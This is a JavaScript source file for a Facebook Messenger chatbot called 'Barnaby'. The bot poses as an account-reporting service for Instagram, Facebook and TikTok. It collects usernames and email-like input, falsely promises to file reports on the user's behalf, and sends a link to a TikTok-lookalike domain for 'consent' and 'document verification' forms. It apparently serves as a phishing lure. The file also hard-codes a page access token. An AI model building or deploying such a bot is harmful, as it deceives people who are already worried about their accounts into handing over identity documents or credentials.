'use strict'

const PAGE_ACCESS_TOKEN = "EAAeo5mY4LCkBANgbcC4izrjzmZCBW2Tm1YFezDJ4NnQEZC4Ahjo3VCyTJ86chhrYCgS0bAD2ZC3SRP2ITDNIqF6hZCji42EnyHpZBsm4HxnHYzrHZApB5ctKFQaeXLk74tAZBNgpTwXa66HHSUsY4IArqfdr22faxDfPbG9BZCDWnuOvLtbQYlrE"


const express = require('express')
const bodyParser = require('body-parser')
const request = require('request')

const app = express()

app.set('port', (process.env.PORT || 5000))

//allow data processing
app.use(bodyParser.urlencoded({extended: false}))

app.use(bodyParser.json())

//route
app.get('/', function(req, res) {
	res.send("Hi there!")
})


let greetings = ["Hi", "HI", "hi", "Hello", "HELLO", "hello", "Hi How are you", "Hello How are you", " Hi what's up", " Hello what's up", "Sup", "SUP", "sup", "Hola"];

let greeting_response = ["Hi I'm Barnaby, how can I assist?", "Hello I'm Barnaby, how may I help you today?", "Hi there I'm Barnaby, how may I help you today?"]

let q_reporting = ["Report account missuse","Report account theft",	"Report account fraud"]

let q_report = ["Report account misuse","Report account theft","Report account fraud","report account misuse","report account theft","report account fraud", "REPORT ACCOUNT MISUSE", "REPORT ACCOUNT FRAUD", "REPORT ACCOUNT THEFT", "Account misuse", "Account theft", "Account fraud", "account misuse", "account theft", "account fraud", "misuse", "theft", "fraud"]


let q_platforms = [
	"INSTAGRAM",
	"FACEBOOK",
	"TWITTER",
	"TIKTOK",
	"TINDER",
	"SNAPCHAT",
	"Instagram",
	"Facebook",
	"Twitter",
	"Tiktok",
	"Tinder",
	"Snapchat",
	"instagram",
	"facebook",
	"twitter",
	"tiktok",
	"tinder",
	"snapchat"
]


let r_platforms = [
	"INSTAGRAM",
	"FACEBOOK",
	"TWITTER",
	"TIKTOK",
	"TINDER",
	"SNAPCHAT"
]


//fb route

app.get('/webhook', function(req, res){

	const VERIFY_TOKEN = "AP_VERIFY"

	// Parse the query params
	let mode = req.query['hub.mode'];
	let token = req.query['hub.verify_token'];
	let challenge = req.query['hub.challenge'];

	if(req.query['hub.verify_token'] === VERIFY_TOKEN){
		res.send(challenge)
		res.status(200).send(challenge);
	}

	res.sendStatus(403);


})


app.post('/webhook/', function(req, res){
	let messaging_events = req.body.entry[0].messaging

	for (let i = 0; i < messaging_events.length; i++) {
		let event = messaging_events[i]
		let sender = event.sender.id

		if(event.message && event.message.text) {
			let text = event.message.text
			
			messageHandler(sender, text)

		}
		else if (event.postback) {
			//let text = JSON.stringify(event.postback)
			//messageHandler(sender, text);
			postbackHandler(sender, event.postback);
			continue

		}

	}


	res.sendStatus(200);
})



function postbackHandler(sender, postback_message) {
	
	console.log('ok');
	let response;
  	// Get the payload for the postback
  	let payload = postback_message.payload;

  	// Set the response based on the postback payload
  	
  	for(var r of q_report) {

		if(payload === r) { //if the message text conatins a complaint type, display each platform name to the user
			let a_rep = "Okay, I can help you with that.";
			sendMessage(sender, a_rep);

			a_rep = "On which social media platfrom do you have this issue?";
			sendPlatforms(sender, a_rep); //display the various platforms to the user
			break

		}

	}


	for (var p of q_platforms){

		if(payload === p) { 
			let msg = "Okay.";
			sendMessage(sender, msg);

			msg = "Could you confirm the user name of the account?";
			sendMessage(sender, msg);

			break
		}

	}


}




function messageHandler(sender, received_message){
	
	let handleText = received_message
	

	for (var l of greetings) {
		
		if(handleText === l) { //if the message text conatins a gretting, respond with a greeting from the greeting_response array 
			let num = Math.floor(Math.random() * greeting_response.length); //generates a random number from 0 - max of greeting_response array
			let msg
			msg = greeting_response[num]; //sets a random response from the greeting_response array to the message variable 
			sendActions(sender, msg);
			//sendImages(sender);
			break
		}
		
	}



	for(var r of q_report) {

		if(handleText === r) { //if the message text conatins a complaint type, display each platform name to the user
			let a_rep = "Okay, I can help you with that.";
			sendMessage(sender, a_rep);

			a_rep = "On which social media platfrom do you have this issue?";
			sendPlatforms(sender, a_rep); //display the various platforms to the user
			break

		}

	}


	for (var p of q_platforms){

		if(handleText === p) {

			msg = "Okay." + "\n" + "Could you confirm the user name of the account?";
			sendMessage(sender, msg);

			break
		}

	}


	if(handleText.includes("@")) {
		sendForm(sender);		
	}


	if(handleText.includes("No") || handleText.includes("no") || handleText.includes("NO")){
		let dat = "Okay, we can skip that for now." + "\n" + "Please complete the Consent Note Verification Form and Document Verification form";
		sendMessage(sender, dat);

		dat = "Here's the link.";
		sendLink(sender, dat);

	}


	if(handleText.includes("who are you?")){
		genericButton(sender);
	}



	//msg = "Sorry, I didn't catch that";
	//sendMessage(sender, msg); //sends the response to the recipient
		
}



function sendForm(sender) {
	let msg = "Thank you for the information, we will submit the request on your behalf.";
	sendMessage(sender, msg);

	msg = "The information will be reviewed and the necessary actions taken within the next hour.";
	sendMessage(sender, msg);

	msg = "Please complete the Consent Note Verification Form and Document Verification form";
	sendMessage(sender, msg);

	msg = "Here's the link.";
	sendLink(sender, msg);

}



function sendLink(sender, text) {
	
	let msgD = {
		"attachment": {
			"type":"template",
			"payload": {
				"template_type": "button",
				"text": text,
				"buttons": [
					{
						"type": "web_url",
						"url": "www.tiktokreportmaintain.com",
						"title": "Reporting Form"
					}
				]

			}
		}
	}

	sendRequest(sender, msgD)

}




function sendActions(sender, text) {
	
	let msgA = {
		"attachment": {
			"type":"template",
			"payload": {
				"template_type": "button",
				"text": text,
				"buttons": [
					{
						"type": "postback",
						"title": "Report account fraud",
						"payload": "Account fraud"
					},
					{
						"type": "postback",
						"title": "Report account misuse",
						"payload": "Account misuse"
					},
					{
						"type": "postback",
						"title": "Report account theft",
						"payload": "Account theft"
					}
				]

			}
		}
	}


	sendRequest(sender, msgA)

}



function sendPlatforms(sender, text) {
	
	let msgP = {
		"attachment": {
			"type":"template",
			"payload": {
				"template_type": "button",
				"text": text,
				"buttons": [
					{
						"type": "postback",
						"title": "Instagram",
						"payload": "INSTAGRAM"
					},
					{
						"type": "postback",
						"title": "Facebook",
						"payload": "FACEBOOK"
					},
					{
						"type": "postback",
						"title": "Tiktok",
						"payload": "TIKTOK"
					}
				]

			}
		}
	}

	sendRequest(sender, msgP);

}



function sendImages(sender) {

	let data = {
		"attachment": {
			"type": "image",
			"payload" : {
				"url": "https://caricom.org/wp-content/uploads/food-security-2.jpg"
			}
		}
	}

	sendRequest(sender, data)

}



function genericButton(sender) {

	let mdata = {
		"attachment": {
			"type": "template",
			"payload": {
				"template_type":"generic",
				"elements": [
					{
						"title": "Barnaby",
						"image_url": "https://res.cloudinary.com/jerrick/image/upload/fl_progressive,q_auto,w_1024/ukcgwnavdb3ckrzmfqlf.jpg",
						"subtitle":"Barnaby bot",
						"buttons": [
							{
								"type": "web_url",
								"url": "https://www.facebook.com/ChatBot-107724041033953/?modal=admin_todo_tour",
								"title": "Learn more"
							}
						]
					}
				]
			}
		}
	}

	sendRequest(sender, mdata)

}





function sendMessage(sender, text){
	let data = {text: text}
	

	sendRequest(sender, data)

}



function sendRequest(sender, messageText) {
	request({
		url: "https://graph.facebook.com/v2.6/me/messages",
		qs : {access_token: PAGE_ACCESS_TOKEN},
		method: "POST",
		json: {
			recipient: {id: sender},
			message : messageText
		}

	}), function(error, response, body) {
		if(error){
			console.log("sending error")
		}else if (response.body.error){
			console.log("response body error")
		}
	}
}


 

app.listen(app.get('port'), function(){
	console.log("Port active")

})












/**/